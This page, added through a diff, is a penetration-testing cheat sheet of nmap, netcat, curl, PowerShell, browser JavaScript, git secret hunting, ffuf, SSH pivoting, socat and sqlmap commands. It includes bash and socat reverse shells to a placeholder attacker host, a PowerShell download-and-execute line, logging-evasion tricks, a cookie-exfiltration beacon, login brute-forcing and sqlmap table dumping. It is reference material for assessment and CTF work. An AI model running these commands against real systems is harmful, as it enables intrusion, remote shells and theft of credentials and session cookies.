@@ -1,0 +1,889 @@
+---
+title: Security Cheatsheet
+description: Fast-reference commands for nmap, netcat, curl, openssl, PowerShell, and browser JavaScript — the essentials for security assessments and CTFs.
+---
+
+# Security Cheat Sheet
+
+Fast-reference commands for recon, enumeration, pivoting, and quick probing. Covers nmap, netcat, curl, openssl, PowerShell, and browser JavaScript console tricks.
+
+---
+
+## nmap
+
+### Host discovery — find live hosts on a subnet
+
+```bash
+nmap -sn 192.168.1.0/24
+```
+
+### Quick service scan — top ports, versions, default scripts
+
+```bash
+nmap -sV -sC -T4 -oA scan_output <target>
+```
+
+### Full TCP port scan
+
+```bash
+nmap -p- -T4 --min-rate 5000 <target>
+```
+
+### OS detection
+
+```bash
+nmap -O --osscan-guess <target>
+```
+
+### UDP — top 1000 ports (slow, run with patience)
+
+```bash
+nmap -sU --top-ports 1000 -T4 <target>
+```
+
+### Stealth SYN scan (requires root)
+
+```bash
+sudo nmap -sS -T4 <target>
+```
+
+### Run vulnerability scripts
+
+```bash
+nmap --script vuln -p 80,443,22 <target>
+```
+
+### Banner grab a specific port
+
+```bash
+nmap -sV --version-intensity 9 -p <port> <target>
+```
+
+### Save in all formats (normal, grepable, XML)
+
+```bash
+nmap -sV -sC -p- -oA full_scan <target>
+```
+
+### Scan from a list of hosts
+
+```bash
+nmap -iL hosts.txt -sV -sC
+```
+
+---
+
+## Netcat (nc)
+
+### Start a listener
+
+```bash
+nc -lvnp 4444
+```
+
+### Connect to a remote host and port
+
+```bash
+nc <target> 4444
+```
+
+### Port scan (TCP, no I/O, verbose)
+
+```bash
+nc -zv <target> 1-1024
+```
+
+### Banner grab over TCP
+
+```bash
+echo '' | nc -v -n -w1 <target> 80
+```
+
+### Receive a file
+
+```bash
+nc -lvnp 4444 > received_file
+```
+
+### Send a file
+
+```bash
+nc <target> 4444 < file_to_send
+```
+
+### UDP listener
+
+```bash
+nc -u -lvnp 4444
+```
+
+### Reverse shell — Bash (run on victim, catch on attacker)
+
+```bash
+bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
+```
+
+### Reverse shell — catch on attacker
+
+```bash
+nc -lvnp 4444
+```
+
+### Quick web request
+
+```bash
+printf 'GET / HTTP/1.0\r\nHost: <target>\r\n\r\n' | nc <target> 80
+```
+
+---
+
+## curl — HTTP Probing
+
+### Fetch response headers only
+
+```bash
+curl -sI https://<target>
+```
+
+### Full verbose request (headers in and out)
+
+```bash
+curl -v https://<target>
+```
+
+### Follow redirects
+
+```bash
+curl -L https://<target>
+```
+
+### POST with form data
+
+```bash
+curl -X POST -d 'username=admin&password=admin' https://<target>/login
+```
+
+### POST JSON body
+
+```bash
+curl -X POST -H 'Content-Type: application/json' \
+     -d '{"user":"admin","pass":"admin"}' https://<target>/api/login
+```
+
+### Custom headers (auth token, custom User-Agent)
+
+```bash
+curl -H 'Authorization: Bearer <token>' \
+     -H 'User-Agent: Mozilla/5.0' https://<target>/api/data
+```
+
+### Skip TLS certificate verification
+
+```bash
+curl -k https://<target>
+```
+
+### Download file silently
+
+```bash
+curl -so output.html https://<target>
+```
+
+### Proxy through Burp Suite
+
+```bash
+curl -x http://127.0.0.1:8080 -k https://<target>
+```
+
+### Check CORS — preflight
+
+```bash
+curl -I -X OPTIONS -H 'Origin: https://evil.com' \
+     -H 'Access-Control-Request-Method: GET' https://<target>/api
+```
+
+---
+
+## openssl — Certificate & Crypto
+
+### Inspect a server's TLS certificate
+
+```bash
+echo | openssl s_client -connect <target>:443 2>/dev/null \
+  | openssl x509 -noout -text
+```
+
+### Show cert expiry only
+
+```bash
+echo | openssl s_client -connect <target>:443 2>/dev/null \
+  | openssl x509 -noout -dates
+```
+
+### Show Subject Alternative Names
+
+```bash
+echo | openssl s_client -connect <target>:443 2>/dev/null \
+  | openssl x509 -noout -ext subjectAltName
+```
+
+### Generate a self-signed cert (e.g. for a listener)
+
+```bash
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
+  -keyout server.key -out server.crt \
+  -subj "/CN=localhost"
+```
+
+### Hash a file
+
+```bash
+openssl dgst -sha256 <file>
+```
+
+### Base64 encode / decode
+
+```bash
+echo -n 'text' | openssl base64
+echo 'dGV4dA==' | openssl base64 -d
+```
+
+### Generate random hex (useful for tokens)
+
+```bash
+openssl rand -hex 32
+```
+
+---
+
+## PowerShell — Recon & Post-Exploitation
+
+### Bypass execution policy for a session
+
+```powershell
+powershell -ExecutionPolicy Bypass -NoProfile
+```
+
+### Download and run a remote script
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/script.ps1')
+```
+
+### Download file to disk
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('http://<attacker>/file', 'C:\Temp\file')
+```
+
+### Encode a command (bypass logging/detection)
+
+```powershell
+$cmd = 'whoami'
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell -EncodedCommand $enc
+```
+
+### List established TCP connections
+
+```powershell
+Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } |
+  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort
+```
+
+### TCP port scan (no tools needed)
+
+```powershell
+1..1024 | ForEach-Object {
+    $tcp = New-Object Net.Sockets.TcpClient
+    try { $tcp.Connect('<target>', $_); "Port $_ OPEN" } catch {} finally { $tcp.Dispose() }
+}
+```
+
+### List local administrators
+
+```powershell
+Get-LocalGroupMember -Group 'Administrators'
+```
+
+### List running processes sorted by CPU
+
+```powershell
+Get-Process | Sort-Object CPU -Descending | Select-Object Name, Id, CPU -First 20
+```
+
+### Get scheduled tasks (look for odd ones)
+
+```powershell
+Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } |
+  Select-Object TaskName, TaskPath, State
+```
+
+### Current user privileges
+
+```powershell
+whoami /priv
+```
+
+### Dump environment variables
+
+```powershell
+[System.Environment]::GetEnvironmentVariables() | Sort-Object Name
+```
+
+### Search for passwords in files (recursive)
+
+```powershell
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.xml,*.config |
+  Select-String -Pattern 'password|passwd|pwd' -CaseSensitive:$false
+```
+
+### Check if AMSI is patched (returns True if bypassed)
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
+  ForEach-Object { $_.GetField('amsiInitFailed','NonPublic,Static').GetValue($null) }
+```
+
+### Get domain info (domain-joined machines)
+
+```powershell
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+```
+
+### List SMB shares on a remote host
+
+```powershell
+Get-SmbShare -CimSession <target>
+```
+
+### Check Windows Defender status
+
+```powershell
+Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled
+```
+
+---
+
+## JavaScript Console — Browser Recon
+
+### Read all cookies (document-accessible)
+
+```javascript
+document.cookie
+```
+
+### Dump localStorage
+
+```javascript
+JSON.stringify(localStorage, null, 2)
+```
+
+### Dump sessionStorage
+
+```javascript
+JSON.stringify(sessionStorage, null, 2)
+```
+
+### Decode a JWT from storage (header + payload)
+
+```javascript
+const token = localStorage.getItem('token') || sessionStorage.getItem('token');
+if (token) {
+  const [h, p] = token.split('.').slice(0,2).map(b => JSON.parse(atob(b.replace(/-/g,'+').replace(/_/g,'/'))));
+  console.log('Header:', h, '\nPayload:', p);
+}
+```
+
+### List all external scripts loaded on the page
+
+```javascript
+Array.from(document.scripts).map(s => s.src).filter(Boolean)
+```
+
+### Extract all links
+
+```javascript
+Array.from(document.links).map(l => l.href)
+```
+
+### List all forms and their inputs
+
+```javascript
+Array.from(document.forms).map(f => ({
+  action: f.action,
+  method: f.method,
+  inputs: Array.from(f.elements).map(e => ({ name: e.name, type: e.type, value: e.value }))
+}))
+```
+
+### Get all hidden input values
+
+```javascript
+Array.from(document.querySelectorAll('input[type=hidden]'))
+  .map(i => ({ name: i.name, value: i.value }))
+```
+
+### Check response headers (CSP, CORS, etc.)
+
+```javascript
+fetch(location.href).then(r => {
+  ['content-security-policy','x-frame-options','strict-transport-security',
+   'x-content-type-options','access-control-allow-origin'].forEach(h =>
+    console.log(h + ':', r.headers.get(h))
+  );
+});
+```
+
+### Exfiltrate cookies via image beacon (PoC only)
+
+```javascript
+new Image().src = 'https://<attacker>/?c=' + encodeURIComponent(document.cookie);
+```
+
+### Enumerate all API calls made by the page (intercept fetch)
+
+```javascript
+const origFetch = window.fetch;
+window.fetch = function(...args) {
+  console.log('[fetch]', args[0], args[1]);
+  return origFetch.apply(this, args);
+};
+```
+
+### Intercept XHR calls
+
+```javascript
+const origOpen = XMLHttpRequest.prototype.open;
+XMLHttpRequest.prototype.open = function(method, url) {
+  console.log('[XHR]', method, url);
+  return origOpen.apply(this, arguments);
+};
+```
+
+### DOM XSS quick probe (harmless alert)
+
+```javascript
+document.getElementById('search').value = '<img src=x onerror=alert(document.domain)>';
+document.querySelector('form').submit();
+```
+
+### List all event listeners on the document (Chrome DevTools)
+
+```javascript
+getEventListeners(document)
+```
+
+---
+
+## Miscellaneous One-Liners
+
+### Python quick HTTP server (serve current directory)
+
+```bash
+python3 -m http.server 8080
+```
+
+### Python HTTPS server with a self-signed cert
+
+```bash
+openssl req -x509 -nodes -days 1 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -subj '/CN=x' 2>/dev/null
+python3 -c "
+import ssl, http.server
+ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+ctx.load_cert_chain('/tmp/c.pem', '/tmp/k.pem')
+srv = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
+srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
+srv.serve_forever()
+"
+```
+
+### Find SUID binaries (Linux privilege escalation check)
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+### Find world-writable directories
+
+```bash
+find / -type d -perm -o+w 2>/dev/null | grep -v '/proc\|/sys'
+```
+
+### Check cron jobs for all users
+
+```bash
+for user in $(cut -d: -f1 /etc/passwd); do
+  crontab -u "$user" -l 2>/dev/null | grep -v '^#' | sed "s/^/$user: /"
+done
+```
+
+### Identify listening services
+
+```bash
+ss -tlnp
+```
+
+### Quick hash cracking reference (hashcat modes)
+
+```bash
+hashcat -m 0    hash.txt wordlist.txt   # MD5
+hashcat -m 100  hash.txt wordlist.txt   # SHA1
+hashcat -m 1000 hash.txt wordlist.txt   # NTLM
+hashcat -m 1800 hash.txt wordlist.txt   # sha512crypt ($6$)
+hashcat -m 3200 hash.txt wordlist.txt   # bcrypt
+hashcat -m 13100 hash.txt wordlist.txt  # Kerberoast (TGS-REP)
+```
+
+### Identify a hash type quickly
+
+```bash
+hashid '<hash>'
+```
+
+---
+
+## Git — Secret Hunting
+
+### Search the entire commit history for keywords
+
+```bash
+git log -p --all --full-history | grep -iE 'password|secret|api.?key|token|private.?key|credentials'
+```
+
+### Find commits that touched a specific filename (including deleted)
+
+```bash
+git log --all --full-history -- '**/.env' '**/*.pem' '**/*.key'
+```
+
+### Show the content of a deleted file from history
+
+```bash
+git show <commit_hash>:.env
+```
+
+### List all stashes (often forgotten secrets)
+
+```bash
+git stash list
+git stash show -p stash@{0}
+```
+
+### Dump every blob ever committed (slow but thorough)
+
+```bash
+git log --all --oneline | awk '{print $1}' | \
+  xargs -I{} git diff-tree --no-commit-id -r {} | \
+  awk '{print $4}' | sort -u | \
+  xargs -I{} git cat-file -p {}
+```
+
+### Scan with Gitleaks (install: `brew install gitleaks` / `apt install gitleaks`)
+
+```bash
+gitleaks detect --source . --verbose --report-path gitleaks-report.json
+```
+
+### Scan a remote repo without cloning
+
+```bash
+gitleaks detect --source https://github.com/org/repo --verbose
+```
+
+### Scan with Trufflehog (finds verified live secrets)
+
+```bash
+trufflehog git file://. --only-verified
+trufflehog github --repo https://github.com/org/repo --only-verified
+```
+
+### Check git config for credentials stored in plain text
+
+```bash
+cat ~/.gitconfig
+git config --list --show-origin | grep -i 'url\|credential\|token'
+```
+
+---
+
+## grep / ripgrep — Secret & Pattern Hunting
+
+### Search recursively for common secret patterns
+
+```bash
+grep -rn --include="*.{js,ts,py,go,rb,php,env,yaml,yml,json,toml,tf,sh}" \
+  -iE 'password\s*=|api.?key\s*=|secret\s*=|token\s*=' .
+```
+
+### Hunt for private keys
+
+```bash
+grep -rn "BEGIN.*PRIVATE KEY" .
+```
+
+### Find AWS access key IDs
+
+```bash
+grep -rn -E 'AKIA[0-9A-Z]{16}' .
+```
+
+### Find JWTs (ey... header pattern)
+
+```bash
+grep -rn -E 'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+' .
+```
+
+### Find credentials embedded in URLs
+
+```bash
+grep -rn -E 'https?://[^:/@\s]+:[^@/\s]+@' .
+```
+
+### Find IP addresses in files
+
+```bash
+grep -rn -E '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' .
+```
+
+### Find base64-encoded strings (likely encoded secrets)
+
+```bash
+grep -rn -E '[A-Za-z0-9+/]{40,}={0,2}' . | grep -v '.min.js'
+```
+
+### Same searches with ripgrep (faster on large repos)
+
+```bash
+rg -i 'password\s*=' --type-add 'config:*.{env,yaml,yml,toml,ini}' -t config .
+rg 'AKIA[0-9A-Z]{16}' .
+rg 'BEGIN.*PRIVATE KEY' .
+```
+
+### Useful regex patterns for piping / scripting
+
+```bash
+# IPv4 address
+\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b
+
+# AWS Access Key
+AKIA[0-9A-Z]{16}
+
+# JWT
+eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+
+
+# PEM private key header
+-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----
+
+# Basic auth credential in URL
+https?://[^:/@\s]+:[^@/\s]+@[^\s]+
+
+# Generic high-entropy string (likely a secret, ≥32 chars)
+[A-Za-z0-9+/=_-]{32,}
+```
+
+---
+
+## ffuf — Web Fuzzing
+
+### Directory/path brute-force
+
+```bash
+ffuf -u https://<target>/FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -mc 200,301,302,403 -t 50
+```
+
+### Subdomain enumeration via Host header
+
+```bash
+ffuf -u https://<target> \
+     -H 'Host: FUZZ.<target>' \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -mc 200,301,302 -fs <size_of_404_response>
+```
+
+### POST parameter fuzzing (login brute-force)
+
+```bash
+ffuf -u https://<target>/login \
+     -X POST \
+     -d 'username=admin&password=FUZZ' \
+     -H 'Content-Type: application/x-www-form-urlencoded' \
+     -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
+     -mc 302 -t 20
+```
+
+### API endpoint fuzzing
+
+```bash
+ffuf -u https://<target>/api/v1/FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
+     -H 'Authorization: Bearer <token>' \
+     -mc 200,201,400,401,403
+```
+
+### Extension fuzzing (find backup files etc.)
+
+```bash
+ffuf -u https://<target>/indexFUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt \
+     -mc 200
+```
+
+### Filter by response size (hide noise)
+
+```bash
+ffuf -u https://<target>/FUZZ -w wordlist.txt -fs 1234
+```
+
+---
+
+## SSH — Tunnelling & Pivoting
+
+### Local port forward — reach an internal service via a bastion
+
+```bash
+# Access internal:3306 as localhost:3306 via bastion
+ssh -L 3306:internal-db:3306 user@bastion -N
+```
+
+### Remote port forward — expose your local listener through a server
+
+```bash
+# Anyone connecting to attacker:4444 lands on your local :4444
+ssh -R 4444:localhost:4444 user@<attacker> -N
+```
+
+### Dynamic SOCKS5 proxy — proxy all traffic through a host
+
+```bash
+ssh -D 1080 user@bastion -N
+# Then: proxychains nmap / curl --socks5 127.0.0.1:1080
+```
+
+### Jump host — reach a host that's only accessible from the bastion
+
+```bash
+ssh -J user@bastion user@internal-host
+```
+
+### Multi-hop jump
+
+```bash
+ssh -J user@jump1,user@jump2 user@final-host
+```
+
+### SSH config shortcut for a jump chain (`~/.ssh/config`)
+
+```
+Host internal
+  HostName 10.10.10.50
+  User ubuntu
+  ProxyJump bastion
+
+Host bastion
+  HostName <public_ip>
+  User ubuntu
+  IdentityFile ~/.ssh/id_rsa
+```
+
+### Copy SSH key to remote host
+
+```bash
+ssh-copy-id -i ~/.ssh/id_rsa.pub user@<target>
+```
+
+### Run a command remotely without a shell
+
+```bash
+ssh user@<target> 'cat /etc/passwd'
+```
+
+---
+
+## socat — Encrypted Shells & Relays
+
+### Simple listener (like nc -lvnp)
+
+```bash
+socat TCP-LISTEN:4444,reuseaddr,fork -
+```
+
+### TLS-encrypted reverse shell — attacker listener
+
+```bash
+# Generate cert first
+openssl req -x509 -nodes -days 1 -newkey rsa:2048 \
+  -keyout /tmp/shell.key -out /tmp/shell.crt -subj '/CN=x'
+
+socat OPENSSL-LISTEN:443,cert=/tmp/shell.crt,key=/tmp/shell.key,verify=0,fork \
+  EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+### TLS-encrypted reverse shell — victim side
+
+```bash
+socat OPENSSL:<attacker>:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+### Port relay — forward all traffic arriving on :8080 to an internal host
+
+```bash
+socat TCP-LISTEN:8080,fork TCP:<internal>:80
+```
+
+### Upload a file over TCP
+
+```bash
+# Receiver
+socat TCP-LISTEN:9000,fork > received_file
+
+# Sender
+socat TCP:<target>:9000 < file_to_send
+```
+
+---
+
+## SQLMap — Injection Testing
+
+### Basic GET parameter test
+
+```bash
+sqlmap -u "https://<target>/page?id=1" --dbs --batch
+```
+
+### POST body injection
+
+```bash
+sqlmap -u "https://<target>/login" \
+       --data "username=test&password=test" \
+       --dbs --batch
+```
+
+### Cookie-based injection
+
+```bash
+sqlmap -u "https://<target>/dashboard" \
+       --cookie "session=<value>" \
+       --level 3 --risk 2 --dbs --batch
+```
+
+### Dump a specific table
+
+```bash
+sqlmap -u "https://<target>/page?id=1" \
+       -D <database> -T users --dump --batch
+```
+
+### Test via Burp Suite saved request file
+
+```bash
+sqlmap -r request.txt --level 5 --risk 3 --dbs --batch
+```
+
+### Attempt OS shell (if DB user has FILE privilege)
+
+```bash
+sqlmap -u "https://<target>/page?id=1" --os-shell --batch
+```
